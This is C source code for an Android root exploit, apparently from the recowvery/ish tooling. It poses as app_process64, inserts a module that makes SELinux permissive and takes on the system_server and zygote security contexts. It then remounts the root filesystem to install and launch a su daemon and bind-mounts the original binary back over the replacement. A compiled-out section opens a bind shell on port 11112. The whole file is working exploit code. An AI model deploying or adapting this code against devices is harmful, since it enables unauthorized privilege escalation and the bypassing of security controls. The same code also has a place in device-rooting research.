/*********************************************
 * 
 * @author jcadduono (recowvery)
 * @author naikel (ish-code)
 * @author chaosmaster (insmod /susetup)
 * 
 *********************************************/

#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <selinux/selinux.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <dirent.h>
#include <lsh.h>

#include <sys/stat.h>
#include <linux/module.h>

#include <sys/stat.h>
#include <fcntl.h>

//extern int init_module(void *module_image, unsigned long len, const char *param_values);
//extern int finit_module(int fd, const char *param_values, int flags);
#include <sys/syscall.h>
#define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)
#define finit_module(mod, opts, flags) syscall(__NR_finit_module, mod, opts, flags)


void lsh_loop();

#define DISABLE_SHELL

#define APP_NAME "app_process64-system_server"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#endif

const char* CONTEXT_SYS = "u:r:system_server:s0";
const char* CONTEXT_ZYGOTE = "u:r:zygote:s0";
const char* CONTEXT_ZYGOTE_EXEC = "u:object_r:zygote_exec:s0";
//const char* CONTEXT_SYS = "u:r:toolbox:s0";

const char* SELINUX_MODULE = "/system/lib/modules/texfat.ko";
const char* APP_PROCESS = "/system/bin/app_process64";
const char* APP_PROCESS_ORIG = "/data/local/tmp/app_process64-original";

// Keep reading until full or EOF
ssize_t readall(int fd, void *buf, size_t len)
{
  size_t count = 0;

  while (count<len) {
    int i = read(fd, (char *)buf+count, len-count);
    if (!i) break;
    if (i<0) return i;
    count += i;
  }

  return count;
}


// Return how long the file at fd is, if there's any way to determine it.
off_t fdlength(int fd)
{
  struct stat st;
  off_t base = 0, range = 1, expand = 1, old;

  if (!fstat(fd, &st) && S_ISREG(st.st_mode)) return st.st_size;

  // If the ioctl works for this, return it.
  // TODO: is blocksize still always 512, or do we stat for it?
  // unsigned int size;
  // if (ioctl(fd, BLKGETSIZE, &size) >= 0) return size*512L;

  // If not, do a binary search for the last location we can read.  (Some
  // block devices don't do BLKGETSIZE right.)  This should probably have
  // a CONFIG option...

  // If not, do a binary search for the last location we can read.

  old = lseek(fd, 0, SEEK_CUR);
  do {
    char temp;
    off_t pos = base + range / 2;

    if (lseek(fd, pos, 0)>=0 && read(fd, &temp, 1)==1) {
      off_t delta = (pos + 1) - base;

      base += delta;
      if (expand) range = (expand <<= 1) - base;
      else range -= delta;
    } else {
      expand = 0;
      range = pos - base;
    }
  } while (range > 0);

  lseek(fd, old, SEEK_SET);

  return base;
}


int main(int argc, char* argv[])
{
  int ret = 1;
	char* conn = NULL;

	LOGV("***********************************************");
	LOGV("*  app_process64 system_server insmod exploit  *");
	LOGV("***********************************************");

  LOGV("Loading selinux-permissive module into buffer");
  char * module_image = NULL;
  int fsize;
  int fd = open(SELINUX_MODULE, O_RDONLY);

  fsize = fdlength(fd);
  module_image = malloc(fsize);
  readall(fd, module_image, fsize);

  //close(fd);

  ret = getcon(&conn);
  if (ret) {
    LOGV("Could not get current security context (ret = %d)!", ret);
  }

  LOGV("Current selinux context: %s", conn);

  ret = setcon(CONTEXT_SYS);
  if (ret) {
    LOGV("Unable to set security context to '%s' (ret = %d)!",
        CONTEXT_SYS, ret);
  }
  LOGV("Set context to '%s'!", CONTEXT_SYS);

  ret = getcon(&conn);
  if (ret) {
    LOGV("Could not get current security context (ret = %d)!", ret);
  }

  if (strcmp(conn, CONTEXT_SYS) != 0) {
    LOGV("Current security context '%s' does not match '%s'!",
        conn, CONTEXT_SYS);
    ret = EINVAL;
  }

  LOGV("Current security context: %s", conn);

  //system("insmod /system/lib/modules/texfat.ko");
  LOGV("insert selinux_permissive.ko: %s", conn);
  int res = init_module(module_image, fsize, "");
  //int res = finit_module(fd, "", MODULE_INIT_IGNORE_MODVERSIONS | MODULE_INIT_IGNORE_VERMAGIC);
  LOGV("module_image size %d", fsize);
  LOGV("init_module returned %d", res);
  close(fd);

  LOGV("mount and run su");
  system("/system/bin/mount -o remount,rw /");
  system("/system/bin/mkdir /su");
  system("/system/bin/mount -o remount,ro /");
  system("/system/bin/sh /data/launch_daemonsu.sh");

  int sid, pid;

  pid = fork();
  if(pid < 0) LOGV("failed forking");
	if(!pid ){
	  umask(0);
    if((sid = setsid()) == -1) LOGV("setsid failed: %s", strerror(errno));
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    ret = setcon(CONTEXT_ZYGOTE);
    if (ret) {
      LOGV("Unable to set security context to '%s' (ret = %d)!",
        CONTEXT_ZYGOTE, ret);
    }

    char cmd_buffer[128] = {};
    LOGV("Set context to '%s'!", CONTEXT_ZYGOTE);
	  LOGV("Start up original app_process");
    snprintf(cmd_buffer, 128, "chcon %s %s", CONTEXT_ZYGOTE_EXEC, APP_PROCESS_ORIG);
    system(cmd_buffer);
    memset(cmd_buffer, 0, 128);
    snprintf(cmd_buffer, 128, "mount -o bind %s %s", APP_PROCESS_ORIG, APP_PROCESS);
    system(cmd_buffer);
    execvp(argv[0], argv);
    LOGV("Failed to exec: %s", strerror(errno));
	}

  //give sudaemon some time
  sleep(5);
  LOGV("Reenable SELinux");
  system("setenforce 1");


/********************************************************************************/
#ifndef DISABLE_SHELL

	LOGV("About to fork a shell");

	int resultfd, sockfd;
	int port = 11112;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0)
	{
		LOGV("no socket\n");
		return 0;
	}
	// syscall socketcall (sys_setsockopt 14)
  int one = 1;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&my_addr,0,sizeof(my_addr));
	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);
	if(resultfd < 0)
	{
		LOGV("no resultfd\n");
		return 0;
	}
	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);
	LOGV("ciao\n");
	// syscall 11
	lsh_loop();

#else
while(1) {}
#endif

}
